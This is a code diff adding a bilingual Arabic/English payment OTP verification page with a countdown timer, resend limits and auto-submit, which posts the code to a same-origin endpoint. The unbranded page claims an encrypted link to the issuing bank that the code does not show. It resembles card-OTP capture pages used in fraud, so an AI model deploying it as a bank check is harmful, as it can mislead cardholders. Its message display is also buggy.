@@ -1,0 +1,730 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title id="pageTitle">التحقق من الهوية</title>
+  
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&family=Plus+Jakarta+Sans:wght@500;700&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      --primary-color: #4f46e5;
+      --accent-gradient: linear-gradient(90deg, #4f46e5 0%, #7c3aed 100%);
+      --text-main: #1e293b;
+      --text-muted: #64748b;
+      --input-bg: #f8fafc;
+      --border-color: #e2e8f0;
+      --error-color: #ef4444;
+      --success-color: #10b981;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    body {
+      font-family: 'Cairo', 'Segoe UI', sans-serif;
+      background-color: #f1f5f9;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      color: var(--text-main);
+    }
+
+    body.lang-en {
+      font-family: 'Plus Jakarta Sans', 'Segoe UI', sans-serif;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 440px;
+      animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+
+    .otp-card {
+      background: #ffffff;
+      border: 1px solid var(--border-color);
+      border-radius: 24px;
+      padding: 50px 30px 40px;
+      box-shadow: 0 20px 40px -15px rgba(15, 23, 42, 0.06);
+      text-align: center;
+      position: relative;
+    }
+
+    .lang-switcher-btn {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      background: var(--input-bg);
+      border: 1px solid var(--border-color);
+      padding: 6px 14px;
+      border-radius: 50px;
+      font-size: 12px;
+      font-weight: 700;
+      cursor: pointer;
+      color: var(--text-main);
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      font-family: inherit;
+    }
+    html[dir="ltr"] .lang-switcher-btn {
+      left: auto;
+      right: 20px;
+    }
+    .lang-switcher-btn:hover {
+      background: #ffffff;
+      border-color: var(--primary-color);
+      color: var(--primary-color);
+    }
+
+    .icon-wrapper {
+      width: 64px;
+      height: 64px;
+      background: #eef2ff;
+      border-radius: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 10px auto 24px;
+      color: var(--primary-color);
+    }
+
+    .header h1 {
+      font-size: 22px;
+      font-weight: 700;
+      color: var(--text-main);
+      margin-bottom: 10px;
+    }
+
+    .header p {
+      color: var(--text-muted);
+      font-size: 14px;
+      line-height: 1.6;
+      margin-bottom: 24px;
+    }
+
+    .otp-inputs {
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+      margin-bottom: 24px;
+      direction: ltr !important;
+    }
+
+    .otp-input {
+      width: 50px;
+      height: 56px;
+      border: 1px solid var(--border-color);
+      border-radius: 12px;
+      font-size: 22px;
+      font-weight: 700;
+      text-align: center;
+      background: var(--input-bg);
+      color: var(--text-main);
+      font-family: 'Plus Jakarta Sans', sans-serif;
+      outline: none;
+    }
+
+    .otp-input:focus {
+      border-color: var(--primary-color);
+      background: #ffffff;
+      box-shadow: 0 0 0 4px rgba(79, 70, 229, 0.1);
+    }
+
+    .otp-input.filled {
+      border-color: var(--primary-color);
+      background: #ffffff;
+    }
+
+    .otp-input.input-error {
+      border-color: var(--error-color) !important;
+      background: #fff5f5 !important;
+      animation: shake 0.4s ease-in-out;
+    }
+
+    .status-message {
+      padding: 12px 16px;
+      border-radius: 12px;
+      font-size: 13px;
+      font-weight: 600;
+      margin-bottom: 24px;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    
+    .status-message.error-style {
+      display: flex;
+      background: #fff5f5;
+      color: var(--error-color);
+      border: 1px solid #fecaca;
+    }
+
+    .status-message.success-style {
+      display: flex;
+      background: #f0fdf4;
+      color: var(--success-color);
+      border: 1px solid #bbf7d0;
+    }
+
+    .timer {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 6px;
+      margin-bottom: 24px;
+      font-size: 13px;
+      color: var(--text-muted);
+      font-weight: 600;
+    }
+
+    .timer-value {
+      color: var(--primary-color);
+      font-family: 'Plus Jakarta Sans', sans-serif;
+      font-weight: 700;
+    }
+
+    .resend-section {
+      margin-bottom: 24px;
+      padding-bottom: 24px;
+      border-bottom: 1px dashed var(--border-color);
+    }
+
+    .resend-text {
+      font-size: 13px;
+      color: var(--text-muted);
+      margin-bottom: 8px;
+    }
+
+    .resend-button {
+      background: none;
+      border: none;
+      color: var(--primary-color);
+      font-size: 13px;
+      font-weight: 700;
+      font-family: inherit;
+      cursor: pointer;
+    }
+
+    .resend-button:hover:not(:disabled) {
+      color: #3730a3;
+    }
+
+    .resend-button:disabled {
+      color: #94a3b8;
+      cursor: not-allowed;
+    }
+
+    .button-group {
+      display: flex;
+      gap: 12px;
+    }
+
+    .btn {
+      flex: 1;
+      padding: 14px;
+      border: none;
+      border-radius: 12px;
+      font-size: 15px;
+      font-weight: 600;
+      font-family: inherit;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .btn-primary {
+      background: var(--accent-gradient);
+      color: #ffffff;
+      box-shadow: 0 4px 15px rgba(79, 70, 229, 0.25);
+    }
+
+    .btn-primary:hover:not(:disabled) {
+      box-shadow: 0 6px 20px rgba(79, 70, 229, 0.4);
+      transform: translateY(-1px);
+    }
+
+    .btn-primary:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+
+    .btn-secondary {
+      background: #ffffff;
+      color: var(--text-main);
+      border: 1px solid var(--border-color);
+    }
+
+    .btn-secondary:hover {
+      background: var(--input-bg);
+    }
+
+    .security-badge {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      color: var(--success-color);
+      font-size: 12px;
+      font-weight: 600;
+      margin-top: 24px;
+    }
+
+    .footer-text {
+      font-size: 11px;
+      color: var(--text-muted);
+      margin-top: 12px;
+    }
+
+    @keyframes slideUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-6px); }
+      75% { transform: translateX(6px); }
+    }
+
+    .spinner {
+      width: 18px;
+      height: 18px;
+      border: 2px solid rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      border-top-color: #ffffff;
+      animation: spin 0.6s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    @media (max-width: 480px) {
+      .otp-card { padding: 50px 20px 30px; }
+      .otp-input { width: 44px; height: 50px; font-size: 18px; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="otp-card">
+      
+      <button type="button" class="lang-switcher-btn" onclick="toggleLanguage()">
+        <span id="langBtnText">English</span>
+      </button>
+      
+      <div class="icon-wrapper">
+        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+      </div>
+
+      <div class="header">
+        <h1 id="mainHeading">التحقق من الرمز الآمن</h1>
+        <p id="subHeading">قم بإدخال رمز التحقق (OTP) المرسل إلى الرقم المسجل في البنك لتأكيد الدفع</p>
+      </div>
+
+      <div class="status-message" id="statusBox"></div>
+
+      <div class="timer" id="timerContainer">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+        <span id="timerText">ينتهي الرمز خلال:</span>
+        <span class="timer-value" id="timerValue">02:00</span>
+      </div>
+
+      <form id="otpForm" onsubmit="handleSubmit(event)">
+        <div class="otp-inputs" id="otpInputs">
+          <input type="tel" class="otp-input" maxlength="1" autocomplete="one-time-code" data-index="0">
+          <input type="tel" class="otp-input" maxlength="1" autocomplete="one-time-code" data-index="1">
+          <input type="tel" class="otp-input" maxlength="1" autocomplete="one-time-code" data-index="2">
+          <input type="tel" class="otp-input" maxlength="1" autocomplete="one-time-code" data-index="3">
+          <input type="tel" class="otp-input" maxlength="1" autocomplete="one-time-code" data-index="4">
+          <input type="tel" class="otp-input" maxlength="1" autocomplete="one-time-code" data-index="5">
+        </div>
+
+        <div class="resend-section">
+          <div class="resend-text" id="resendText">لم يصلك رمز التحقق؟</div>
+          <button type="button" class="resend-button" id="resendButton" onclick="resendOTP(event)">
+            إعادة إرسال الرمز
+          </button>
+        </div>
+
+        <div class="button-group">
+          <button type="button" class="btn btn-secondary" id="cancelBtn" onclick="goBack()">إلغاء</button>
+          <button type="submit" class="btn btn-primary" id="submitBtn">
+            تأكيد العملية
+          </button>
+        </div>
+      </form>
+
+      <div class="security-badge">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+        <span id="securityBadgeText">اتصال محمي ومشفر بالكامل بالبنك الصادر</span>
+      </div>
+
+      <div class="footer-text" id="footerText">حماية معتمدة 2026 لحماية أمن بطاقات الائتمان</div>
+    </div>
+  </div>
+
+  <script>
+    const locales = {
+      ar: {
+        title: "التحقق من الهوية",
+        heading: "التحقق من الرمز الآمن",
+        subHeading: "قم بإدخال رمز التحقق (OTP) المرسل إلى الرقم المسجل في البنك لتأكيد الدفع",
+        timerText: "ينتهي الرمز خلال:",
+        resendText: "لم يصلك رمز التحقق؟",
+        resendBtn: "إعادة إرسال الرمز",
+        resendBtnLimit: "تم تجاوز الحد الأقصى للإرسال",
+        resendCountPrefix: "إعادة الإرسال",
+        cancelBtn: "إلغاء",
+        submitBtn: "تأكيد العملية",
+        submitBtnLoading: "جاري تأكيد الرمز...",
+        securityBadge: "اتصال محمي ومشفر بالكامل بالبنك الصادر",
+        footer: "حماية معتمدة 2026 لحماية أمن بطاقات الائتمان",
+        langBtn: "English",
+        msgEmpty: "يرجى ملء كافة حقول رمز التأكيد بشكل كامل.",
+        msgSuccess: "تم التحقق من الرمز بنجاح وتأكيد الدفع الآمن.",
+        msgError: "رمز التحقق المدخل غير صحيح، يرجى مراجعة الرسالة والمحاولة مجدداً.",
+        msgExpired: "انتهت صلاحية الرمز الفوري، يرجى إعادة طلب رمز آخر.",
+        msgLimit: "لقد تجاوزت الحد المسموح به لطلب رموز الدفع المؤقتة.",
+        msgSuccessResend: "تم إرسال رمز تحقق جديد إلى رقم الهاتف المربوط ببطاقتك.",
+        confirmBack: "هل تريد إلغاء عملية الدفع الآمن الحالية؟"
+      },
+      en: {
+        title: "Identity Verification",
+        heading: "Secure OTP Verification",
+        subHeading: "Please enter the verification code (OTP) sent to your registered bank phone number to confirm payment",
+        timerText: "Code expires in:",
+        resendText: "Didn't receive the code?",
+        resendBtn: "Resend Code",
+        resendBtnLimit: "Resend limit reached",
+        resendCountPrefix: "Resend",
+        cancelBtn: "Cancel",
+        submitBtn: "Confirm Payment",
+        submitBtnLoading: "Verifying code...",
+        securityBadge: "Fully secure and encrypted connection with the issuing bank",
+        footer: "Certified 2026 security for payment card protection",
+        langBtn: "العربية",
+        msgEmpty: "Please fill in all verification code fields.",
+        msgSuccess: "Code verified successfully! Securing payment.",
+        msgError: "The verification code is incorrect. Please check and try again.",
+        msgExpired: "The OTP has expired. Please request a new code.",
+        msgLimit: "You have reached the maximum limit for OTP requests.",
+        msgSuccessResend: "A new verification code has been sent to your phone.",
+        confirmBack: "Are you sure you want to cancel the current secure payment process?"
+      }
+    };
+
+    let currentLang = 'ar';
+    let timerInterval = null;
+    let timeRemaining = 120;
+    let resendCount = 0;
+    const maxResendCount = 3;
+
+    const otpInputs = document.querySelectorAll('.otp-input');
+    const statusBox = document.getElementById('statusBox');
+    const resendButton = document.getElementById('resendButton');
+    const timerDisplay = document.getElementById('timerValue');
+    const timerContainer = document.getElementById('timerContainer');
+    const submitBtn = document.getElementById('submitBtn');
+
+    function applyLanguage(lang) {
+      currentLang = lang;
+      const dict = locales[lang];
+      
+      document.documentElement.lang = lang;
+      document.documentElement.dir = lang === 'ar' ? 'rtl' : 'ltr';
+      
+      if(lang === 'en') {
+        document.body.classList.add('lang-en');
+      } else {
+        document.body.classList.remove('lang-en');
+      }
+
+      document.getElementById('pageTitle').textContent = dict.title;
+      document.getElementById('mainHeading').textContent = dict.heading;
+      document.getElementById('subHeading').textContent = dict.subHeading;
+      document.getElementById('timerText').textContent = dict.timerText;
+      document.getElementById('resendText').textContent = dict.resendText;
+      document.getElementById('cancelBtn').textContent = dict.cancelBtn;
+      document.getElementById('securityBadgeText').textContent = dict.securityBadge;
+      document.getElementById('footerText').textContent = dict.footer;
+      document.getElementById('langBtnText').textContent = dict.langBtn;
+
+      if(!submitBtn.disabled) {
+        submitBtn.textContent = dict.submitBtn;
+      }
+      
+      if(resendCount >= maxResendCount) {
+        resendButton.textContent = dict.resendBtnLimit;
+      } else if (timeRemaining > 0 && resendButton.disabled) {
+        resendButton.textContent = dict.resendBtn;
+      } else {
+        resendButton.textContent = resendCount > 0 ? `${dict.resendCountPrefix} (${maxResendCount - resendCount})` : dict.resendBtn;
+      }
+    }
+
+    function toggleLanguage() {
+      const targetLang = currentLang === 'ar' ? 'en' : 'ar';
+      applyLanguage(targetLang);
+      clearMessages();
+    }
+
+    function detectDeviceLanguage() {
+      const browserLang = navigator.language || navigator.userLanguage;
+      if (browserLang && browserLang.startsWith('en')) {
+        applyLanguage('en');
+      } else {
+        applyLanguage('ar');
+      }
+    }
+
+    otpInputs.forEach((input, index) => {
+      input.addEventListener('input', (e) => {
+        let val = e.target.value.replace(/\D/g, '');
+        e.target.value = val;
+
+        if (val) {
+          input.classList.add('filled');
+          if (index < otpInputs.length - 1) {
+            otpInputs[index + 1].focus();
+          }
+        } else {
+          input.classList.remove('filled');
+        }
+
+        checkAutoSubmit();
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace') {
+          if (!input.value && index > 0) {
+            otpInputs[index - 1].value = '';
+            otpInputs[index - 1].classList.remove('filled');
+            otpInputs[index - 1].focus();
+          } else {
+            input.value = '';
+            input.classList.remove('filled');
+          }
+        }
+      });
+
+      input.addEventListener('paste', (e) => {
+        e.preventDefault();
+        const pastedData = (e.clipboardData || window.clipboardData).getData('text');
+        const digits = pastedData.replace(/\D/g, '').split('');
+
+        digits.forEach((digit, i) => {
+          if (i < otpInputs.length) {
+            otpInputs[i].value = digit;
+            otpInputs[i].classList.add('filled');
+          }
+        });
+
+        const focusTarget = Math.min(digits.length, otpInputs.length - 1);
+        otpInputs[focusTarget].focus();
+        checkAutoSubmit();
+      });
+    });
+
+    window.addEventListener('DOMContentLoaded', () => {
+      detectDeviceLanguage();
+      otpInputs[0].focus();
+      startTimer();
+    });
+
+    function startTimer() {
+      if (timerInterval) clearInterval(timerInterval);
+      timeRemaining = 120;
+      resendButton.disabled = true;
+      timerContainer.style.color = 'var(--text-muted)';
+
+      timerInterval = setInterval(() => {
+        timeRemaining--;
+        const minutes = Math.floor(timeRemaining / 60);
+        const seconds = timeRemaining % 60;
+        timerDisplay.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+
+        if (timeRemaining <= 0) {
+          clearInterval(timerInterval);
+          resendButton.disabled = false;
+          timerDisplay.textContent = '00:00';
+          showMessage('error', locales[currentLang].msgExpired);
+        }
+
+        if (timeRemaining <= 20) {
+          timerContainer.style.color = 'var(--error-color)';
+        }
+      }, 1000);
+    }
+
+    function checkAutoSubmit() {
+      const allFilled = Array.from(otpInputs).every(input => input.value);
+      if (allFilled) {
+        setTimeout(() => handleSubmit(), 200);
+      }
+    }
+
+    function showMessage(type, text) {
+      statusBox.textContent = text;
+      statusBox.className = 'status-message'; 
+      if (type === 'error') {
+        statusBox.classList.add('error-style');
+      } else {
+        statusBox.classList.add('success-style');
+      }
+    }
+
+    function clearMessages() {
+      statusBox.style.display = 'none';
+    }
+
+    function handleSubmit(event) {
+      if (event) event.preventDefault();
+      clearMessages();
+
+      const otp = Array.from(otpInputs).map(input => input.value).join('');
+
+      if (otp.length !== 6) {
+        showMessage('error', locales[currentLang].msgEmpty);
+        shakeInputs();
+        return;
+      }
+
+      verifyOTP(otp);
+    }
+
+    function verifyOTP(otp) {
+      submitBtn.disabled = true;
+      submitBtn.innerHTML = `<span class="spinner"></span> ${locales[currentLang].submitBtnLoading}`;
+
+      fetch('/api/verify-otp', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ otp: otp })
+      })
+      .then(response => {
+        if (!response.ok) throw new Error('Session missing or server error');
+        return response.json();
+      })
+      .then(data => {
+        console.log('استجابة السيرفر:', data);
+        
+        // التحقق من نجاح التحقق من OTP
+        if (data.success === true) {
+          // عرض رسالة النجاح
+          showMessage('success', locales[currentLang].msgSuccess);
+          
+          // تأخير قليل قبل الانتقال لصفحة النجاح
+          setTimeout(() => {
+            window.location.href = 'success.html';
+          }, 1500);
+        } else {
+          // عرض رسالة الخطأ
+          showMessage('error', locales[currentLang].msgError);
+          shakeInputs();
+          clearOTPFields();
+          
+          submitBtn.disabled = false;
+          submitBtn.textContent = locales[currentLang].submitBtn;
+          otpInputs[0].focus();
+        }
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        showMessage('error', locales[currentLang].msgError);
+        shakeInputs();
+        clearOTPFields();
+        submitBtn.disabled = false;
+        submitBtn.textContent = locales[currentLang].submitBtn;
+        otpInputs[0].focus();
+      });
+    }
+
+    function resendOTP(event) {
+      event.preventDefault();
+      clearMessages();
+
+      if (resendCount >= maxResendCount) {
+        showMessage('error', locales[currentLang].msgLimit);
+        return;
+      }
+
+      resendCount++;
+      resendButton.disabled = true;
+      
+      // إرسال طلب إعادة الإرسال إلى السيرفر
+      fetch('/api/resend-otp', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ resendCount: resendCount })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.success) {
+          showMessage('success', locales[currentLang].msgSuccessResend);
+          clearOTPFields();
+          startTimer();
+          otpInputs[0].focus();
+        } else {
+          showMessage('error', data.message || locales[currentLang].msgError);
+          resendCount--;
+        }
+
+        if (resendCount >= maxResendCount) {
+          resendButton.textContent = locales[currentLang].resendBtnLimit;
+          resendButton.disabled = true;
+        } else {
+          resendButton.textContent = `${locales[currentLang].resendCountPrefix} (${maxResendCount - resendCount})`;
+          resendButton.disabled = true; // سيتم تفعيله عندما ينتهي الموقت
+        }
+      })
+      .catch(error => {
+        console.error('Error resending OTP:', error);
+        showMessage('error', locales[currentLang].msgError);
+        resendCount--;
+        resendButton.disabled = false;
+      });
+    }
+
+    function clearOTPFields() {
+      otpInputs.forEach(input => {
+        input.value = '';
+        input.classList.remove('filled', 'input-error');
+      });
+    }
+
+    function shakeInputs() {
+      otpInputs.forEach(input => {
+        input.classList.add('input-error');
+        setTimeout(() => {
+          input.classList.remove('input-error');
+        }, 500);
+      });
+    }
+
+    function goBack() {
+      if (confirm(locales[currentLang].confirmBack)) {
+        window.location.href = 'payment.html';
+      }
+    }
+  </script>
+</body>
+</html>
